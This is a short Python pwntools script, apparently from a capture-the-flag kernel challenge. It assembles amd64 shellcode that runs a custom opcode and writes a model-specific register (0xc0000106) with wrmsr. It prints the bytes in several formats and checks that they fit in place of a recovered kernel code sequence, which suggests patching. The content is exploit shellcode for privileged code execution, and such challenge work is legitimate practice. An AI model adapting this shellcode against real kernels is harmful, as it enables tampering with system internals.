
from pwn import *

context.arch = 'amd64'
context.bits = '64'
#define MSR_HACK4_SLICE_SIZE            0xc0000105
#define MSR_HACK4_NUM_SLICES            0xc0000106

# "mov %0, %%rdi\n\t"
# ".byte 0x0f; .byte 0x0a; .byte 0x89\n\t" // scrhlw
sc= asm("""
mov rdi, 0xcafe0000
.byte 0x0f; .byte 0x0a; .byte 0x89 ;

mov ecx, 0xc0000106;
xor edx, edx
mov eax, 0x80
 wrmsr
 xor eax, eax


ret
""")

import binascii
print(binascii.hexlify(sc))
c_array = ', '.join(f'0x{byte:02x}' for byte in sc)
print(c_array)

print(disasm(sc))

recover = '''
48 89 f8 f7 c7 ff 0f 00 00 75 12 48 3b 3d ce 3b 
9e 00 72 09 48 89 c7 0f 0a 89 31 c0 c3 b8 ea ff'''
recover = recover.replace(' ', '').replace('\n', '')
recover = binascii.unhexlify(recover)
c_array = ', '.join(f'0x{byte:02x}' for byte in recover)
print(c_array)

assert len(sc) < len(recover)